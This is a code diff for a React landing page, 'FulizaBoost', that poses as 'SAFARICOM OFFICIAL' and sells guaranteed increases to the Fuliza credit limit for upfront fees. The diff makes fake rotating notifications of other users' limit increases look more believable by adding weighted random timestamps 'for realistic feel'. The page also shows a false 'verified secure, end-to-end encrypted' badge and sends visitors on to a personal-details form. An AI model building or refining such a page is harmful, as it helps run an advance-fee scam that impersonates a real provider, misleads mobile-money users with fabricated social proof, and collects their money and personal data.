@@ -2,7 +2,6 @@ import { useState, useEffect } from "react";
 import "../styles/Home.css";
 import { useNavigate } from "react-router-dom";
 
-
 type LimitOption = {
   amount: number;
   fee: number;
@@ -17,8 +16,7 @@ const limits: LimitOption[] = [
   { amount: 35000, fee: 3500 },
   { amount: 45000, fee: 5000 },
   { amount: 50000, fee: 7500 },
-   { amount: 55000, fee: 10000 },
-  
+  { amount: 55000, fee: 10000 },
 ];
 
 const notifications = [
@@ -34,20 +32,49 @@ const notifications = [
   { phone: "0791****89", limit: 45000 },
 ];
 
+// Weighted notification times for realistic feel
+const notificationTimes = [
+  { label: "just now", weight: 50 },
+  { label: "3 mins ago", weight: 25 },
+  { label: "5 mins ago", weight: 15 },
+  { label: "6 mins ago", weight: 7 },
+  { label: "10 mins ago", weight: 3 },
+];
+
+// Helper function to pick a random weighted time
+const getRandomTime = () => {
+  const totalWeight = notificationTimes.reduce((sum, t) => sum + t.weight, 0);
+  let rand = Math.random() * totalWeight;
+
+  for (const t of notificationTimes) {
+    if (rand < t.weight) return t.label;
+    rand -= t.weight;
+  }
+  return "just now"; // fallback
+};
+
 const Home = () => {
   const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
-  const [currentNotification, setCurrentNotification] = useState(notifications[0]);
+  const [currentNotification, setCurrentNotification] = useState({
+    ...notifications[0],
+    time: "just now",
+  });
   const [showNotification, setShowNotification] = useState(true);
   const navigate = useNavigate();
-  
+
   // Change notification every 4 seconds
   useEffect(() => {
     const interval = setInterval(() => {
       setShowNotification(false);
-      
+
       setTimeout(() => {
         const randomIndex = Math.floor(Math.random() * notifications.length);
-        setCurrentNotification(notifications[randomIndex]);
+
+        setCurrentNotification({
+          ...notifications[randomIndex],
+          time: getRandomTime(),
+        });
+
         setShowNotification(true);
       }, 300);
     }, 4000);
@@ -55,28 +82,29 @@ const Home = () => {
     return () => clearInterval(interval);
   }, []);
 
-   const handleBadgeClick = () => {
-    navigate("/login"); // or whatever route your login page is
+  const handleBadgeClick = () => {
+    navigate("/login"); // redirect to login page
   };
 
   return (
     <main className="container">
       {/* HEADER */}
-      <div className="badge" onClick={handleBadgeClick}>● SAFARICOM OFFICIAL</div>
+      <div className="badge" onClick={handleBadgeClick}>
+        ● SAFARICOM OFFICIAL
+      </div>
 
       {/* NOTIFICATION OVERLAY */}
-      <div className={`notification-overlay ${showNotification ? 'show' : ''}`}>
+      <div className={`notification-overlay ${showNotification ? "show" : ""}`}>
         <div className="notification-icon"></div>
         <div className="notification-content">
-          <strong>{currentNotification.phone}</strong> increased to Ksh {currentNotification.limit.toLocaleString()}
-          <div className="notification-time">• just now</div>
+          <strong>{currentNotification.phone}</strong> increased to Ksh{" "}
+          {currentNotification.limit.toLocaleString()}
+          <div className="notification-time">• {currentNotification.time}</div>
         </div>
       </div>
 
       <h1 className="title">FulizaBoost</h1>
-      <p className="subtitle">
-        Instant Limit Increase • Guaranteed Approval
-      </p>
+      <p className="subtitle">Instant Limit Increase • Guaranteed Approval</p>
 
       {/* INFO */}
       <div className="info-box">
@@ -86,7 +114,6 @@ const Home = () => {
 
       {/* LIMITS */}
       <h3 className="section-title">Select Your Fuliza Limit</h3>
-
       <div className="grid">
         {limits.map((item) => {
           const isActive = selectedAmount === item.amount;
@@ -98,24 +125,20 @@ const Home = () => {
               onClick={() => setSelectedAmount(item.amount)}
             >
               <h2>Ksh {item.amount.toLocaleString()}</h2>
-              <span className="fee">
-                Fee: Ksh {item.fee.toLocaleString()}
-              </span>
+              <span className="fee">Fee: Ksh {item.fee.toLocaleString()}</span>
             </div>
           );
         })}
       </div>
 
       {/* FOOTER */}
-      <div className="secure">
-        🔒 VERIFIED SECURE • END-TO-END ENCRYPTED
-      </div>
-      
+      <div className="secure">🔒 VERIFIED SECURE • END-TO-END ENCRYPTED</div>
+
       <button
         className={`continue-btn ${selectedAmount ? "enabled" : ""}`}
         disabled={!selectedAmount}
         onClick={() => {
-          const selectedLimit = limits.find(l => l.amount === selectedAmount);
+          const selectedLimit = limits.find((l) => l.amount === selectedAmount);
           if (selectedLimit) {
             navigate("/personal-details", { state: selectedLimit });
             sessionStorage.setItem("selectedLimit", JSON.stringify(selectedLimit));
